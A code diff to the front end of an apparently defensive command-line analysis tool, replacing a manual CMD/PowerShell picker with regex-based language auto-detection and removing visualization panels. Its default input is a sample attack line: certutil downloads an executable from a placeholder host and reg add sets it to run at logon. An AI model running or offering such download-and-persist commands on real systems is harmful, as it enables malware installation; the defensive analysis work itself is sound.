@@ -21,10 +21,6 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Textarea } from "@/components/ui/textarea";
 import { Badge } from "@/components/ui/badge";
 import { toast } from "sonner";
-import { StickyVerdictHeader } from "@/components/rc5/StickyVerdictHeader";
-import { ExecutionGraphSVG } from "@/components/rc5/ExecutionGraphSVG";
-import { BehaviorTimeline } from "@/components/rc5/BehaviorTimeline";
-import { MitreEvidenceTable } from "@/components/rc5/MitreEvidenceTable";
 
 const TIER_STYLE = {
   Benign:     "bg-emerald-950 text-emerald-300 border-emerald-800",
@@ -59,12 +55,48 @@ const AnalystRC5Page = () => {
   const [input, setInput] = useState(
     "certutil -urlcache -f http://x.tld/a.exe C:\\a.exe && " +
     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\a.exe /f");
-  const [language, setLanguage] = useState("cmd");
+  // Auto-detected language — analyst never needs to pick manually.
+  // Detection is deterministic; see detectLanguage() below.
   const [loading, setLoading] = useState(false);
   const [rc5, setRc5] = useState(null);
   const [xDecodeMs, setXDecodeMs] = useState(null);
+  const [detected, setDetected] = useState("cmd");
   const [gate, setGate] = useState(null);
   const [golden, setGolden] = useState(null);
+
+  // ── Deterministic language auto-detection (no manual selector) ──
+  // Uses ordered marker scoring — no regex on secrets, no AI. Ties
+  // break toward `cmd` (safer default). Exposed via `detected` state
+  // so the badge next to AUTO-INVESTIGATE reflects the pick.
+  const detectLanguage = useCallback((src) => {
+    const s = (src || "").trim();
+    if (!s) return "cmd";
+    const lower = s.toLowerCase();
+    let ps = 0, cmd = 0;
+    // Strong PS markers
+    if (/\$\w+\s*=/.test(s)) ps += 3;             // $var = …
+    if (/-enc(?:odedcommand)?\b/i.test(s)) ps += 4; // powershell -enc
+    if (/-executionpolicy\b/i.test(s)) ps += 3;
+    if (/(^|\s)iex\b/i.test(s)) ps += 3;
+    if (/(invoke-expression|invoke-webrequest|invoke-restmethod)/i.test(s)) ps += 3;
+    if (/new-object\b/i.test(s)) ps += 3;
+    if (/\bwrite-host\b|\bget-\w+|\bset-\w+|\bstart-\w+|\bstop-\w+/i.test(s)) ps += 2;
+    if (/\[system\.|\[convert\]|\[text\.encoding\]|\[net\.webclient\]|\[char\]/i.test(s)) ps += 3;
+    if (/\|\s*iex\b/i.test(s)) ps += 4;
+    if (/-\w+\s+@\{/.test(s)) ps += 2;             // splatting
+    if (/\bpowershell(\.exe)?\b/i.test(lower)) ps += 2;
+    // Strong CMD markers
+    if (/\b(certutil|reg\s+(add|delete|query)|wmic|schtasks|sc\s|vssadmin|net\s+(user|group|localgroup)|netsh|bcdedit|robocopy|xcopy)\b/i.test(s)) cmd += 3;
+    if (/%\w+%/.test(s)) cmd += 2;                 // %ENV% variables
+    if (/\^&|\^\||\^</.test(s)) cmd += 2;           // cmd escape ^
+    if (/\bcmd(\.exe)?\s+\/[a-z]/i.test(s)) cmd += 3;
+    if (/\/[a-zA-Z]\b(?![:\/])/.test(s)) cmd += 1; // /S /Q /F …
+    if (/&&/.test(s)) cmd += 1;
+    return ps > cmd ? "powershell" : "cmd";
+  }, []);
+
+  // Re-detect on every input change so the badge stays fresh.
+  useEffect(() => { setDetected(detectLanguage(input)); }, [input, detectLanguage]);
 
   const load = useCallback(async () => {
     try {
@@ -81,17 +113,21 @@ const AnalystRC5Page = () => {
   const analyze = useCallback(async () => {
     if (!input.trim()) return;
     setLoading(true);
+    // Compute once at click-time so the API + badge stay in sync.
+    const lang = detectLanguage(input);
+    setDetected(lang);
     try {
-      const r = await api.post("/rc5/parse", { input, language });
+      const r = await api.post("/rc5/parse", { input, language: lang });
       setRc5(r.data);
       const ms = r.headers?.["x-decode-ms"] || r.headers?.["X-Decode-Ms"];
       setXDecodeMs(ms || null);
+      toast.success(`Auto-investigate complete · detected ${lang.toUpperCase()}`);
     } catch (e) {
       toast.error(e?.response?.data?.detail || "RC5 parse failed");
     } finally {
       setLoading(false);
     }
-  }, [input, language]);
+  }, [input, detectLanguage]);
 
   const runGolden = useCallback(async () => {
     setLoading(true);
@@ -116,13 +152,14 @@ const AnalystRC5Page = () => {
 
   const exportBundle = useCallback(async (fmt) => {
     try {
+      const lang = detectLanguage(input);
       const r = await api.post("/rc5/explain/export",
-        { input, language, format: fmt }, { responseType: "blob" });
+        { input, language: lang, format: fmt }, { responseType: "blob" });
       downloadBlob(r.data, `nivxray-explain.${fmt}`);
     } catch (_e) {
       toast.error(`Export ${fmt} failed`);
     }
-  }, [input, language]);
+  }, [input, detectLanguage]);
 
   const downloadNavigatorJson = useCallback(() => {
     if (!rc5?.mitre_navigator) return;
@@ -134,26 +171,19 @@ const AnalystRC5Page = () => {
   }, [rc5]);
 
   return (
-    <div className="min-h-screen bg-[#020617] text-slate-100" data-testid="analyst-rc5-page">
-      {rc5?.verdict && (
-        <StickyVerdictHeader
-          verdict={rc5.verdict}
-          xDecodeMs={xDecodeMs}
-          runId={rc5?.run_id}
-        />
-      )}
-      <div className="max-w-7xl mx-auto space-y-6 p-6">
+    <div className="min-h-screen bg-[#0e1116] text-slate-100 p-6" data-testid="analyst-rc5-page">
+      <div className="max-w-7xl mx-auto space-y-6">
         <header className="flex items-baseline justify-between">
           <div>
-            <h1 className="text-2xl font-bold text-sky-300 tracking-tight">NivXRay · RC5 Analyst</h1>
-            <p className="text-[11px] font-mono tracking-tight text-slate-500 uppercase">
+            <h1 className="text-2xl font-bold text-sky-300">NivXRay · RC5 Analyst</h1>
+            <p className="text-xs text-slate-500">
               Deterministic-first · Evidence-linked · No AI in decoded fields
             </p>
           </div>
           <div className="flex gap-2 text-xs">
             {xDecodeMs && (
               <Badge data-testid="x-decode-ms-badge"
-                     className="bg-slate-800 text-sky-300 border border-slate-700 font-mono">
+                     className="bg-slate-800 text-sky-300 border border-slate-700">
                 X-Decode-Ms {xDecodeMs}
               </Badge>
             )}
@@ -180,19 +210,26 @@ const AnalystRC5Page = () => {
               rows={4}
               className="bg-slate-950 border-slate-800 text-slate-100 font-mono text-xs"
             />
-            <div className="flex items-center gap-3">
-              <select data-testid="rc5-language"
-                      value={language}
-                      onChange={(e) => setLanguage(e.target.value)}
-                      className="bg-slate-950 border border-slate-800 text-slate-200
-                                 rounded px-3 py-1.5 text-sm">
-                <option value="cmd">CMD</option>
-                <option value="powershell">PowerShell</option>
-              </select>
+            <div className="flex items-center gap-3 flex-wrap">
+              {/* Deterministic auto-detected language — read-only badge.
+                  Analyst never needs to pick manually. */}
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded
+                              bg-slate-950 border border-slate-800"
+                   title="Language auto-detected from input markers"
+                   data-testid="rc5-detected-language">
+                <span className="text-[10px] font-mono uppercase tracking-wider text-slate-500">
+                  auto-detected
+                </span>
+                <span className="text-xs font-mono font-semibold text-emerald-300 uppercase"
+                      data-testid="rc5-detected-language-value">
+                  {detected}
+                </span>
+              </div>
               <Button data-testid="rc5-analyze"
-                      onClick={analyze} disabled={loading}
-                      className="bg-sky-600 hover:bg-sky-500">
-                {loading ? "Analyzing…" : "Analyze"}
+                      onClick={analyze} disabled={loading || !input.trim()}
+                      className="bg-emerald-600 hover:bg-emerald-500 text-white
+                                 uppercase tracking-wider font-semibold">
+                {loading ? "Investigating…" : "◈ Auto-Investigate"}
               </Button>
               <div className="ml-auto flex gap-2">
                 <Button data-testid="export-json" variant="outline"
@@ -214,45 +251,6 @@ const AnalystRC5Page = () => {
             </div>
           </CardContent>
         </Card>
-
-        {/* SOC-Prime-inspired visualization panels (Phase 9.5c+) */}
-        {rc5 && (
-          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
-            <Card className="bg-slate-900 border-slate-800 lg:col-span-2"
-                  data-testid="execution-graph-panel">
-              <CardHeader className="pb-2">
-                <CardTitle className="text-slate-200 text-sm uppercase tracking-[0.1em] font-mono">
-                  Execution Graph · {rc5?.graph?.nodes?.length || 0} nodes
-                </CardTitle>
-              </CardHeader>
-              <CardContent>
-                <ExecutionGraphSVG graph={rc5.graph} />
-              </CardContent>
-            </Card>
-            <Card className="bg-slate-900 border-slate-800"
-                  data-testid="behavior-timeline-panel">
-              <CardHeader className="pb-2">
-                <CardTitle className="text-slate-200 text-sm uppercase tracking-[0.1em] font-mono">
-                  Behavior Timeline · {rc5?.behaviors?.length || 0}
-                </CardTitle>
-              </CardHeader>
-              <CardContent>
-                <BehaviorTimeline behaviors={rc5.behaviors} />
-              </CardContent>
-            </Card>
-          </div>
-        )}
-
-        {rc5?.mitre?.length ? (
-          <Card className="bg-slate-900 border-slate-800" data-testid="mitre-drilldown-panel">
-            <CardContent className="pt-4">
-              <MitreEvidenceTable
-                mitre={rc5.mitre}
-                navigatorLayer={rc5.mitre_navigator}
-              />
-            </CardContent>
-          </Card>
-        ) : null}
 
         {rc5 && <ResultsPanel rc5={rc5}
                               onNavJson={downloadNavigatorJson}
